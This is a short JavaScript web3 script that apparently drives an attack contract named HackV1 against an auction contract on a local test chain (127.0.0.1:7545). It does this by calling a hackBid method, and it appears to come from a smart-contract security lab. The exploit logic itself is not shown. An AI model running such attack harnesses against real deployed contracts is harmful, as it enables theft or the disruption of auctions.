async function main() {

    const solData = require('../build/contracts/HackV1.json');
    const abi = solData.abi;

    const hackContAddr = '0x1c051632b5EC93cF56BE6Ba8f9896f6245F8339E';
    const acutionContAddr = '0xb262EA2c913Cf4388849c4c87d1bA0B902238c90';

    const { Web3 } = require("web3");

    // set the provider you want from Web3.providers
    const web3 = new Web3("http://127.0.0.1:7545");
    try {

        var myContract = new web3.eth.Contract(abi, hackContAddr);

        var accountFrom = '0x8554e67e8e9aaA9765B4c8dBfff7e60141a4328d';

        const balance = await web3.eth.getBalance(hackContAddr);

        console.log('contract balance:', web3.utils.fromWei(balance, 'ether'));

        await myContract.methods.hackBid(acutionContAddr).send({
            from: accountFrom,
            gas: 1500000,
            data: "",
            value: web3.utils.toWei('0', 'ether')
        });
    } catch (err) {
        console.log(err);
    }
    //const bidders = await myContract.methods.bidders(1).call();
    //console.log('Bidders:', bidders);
}

main();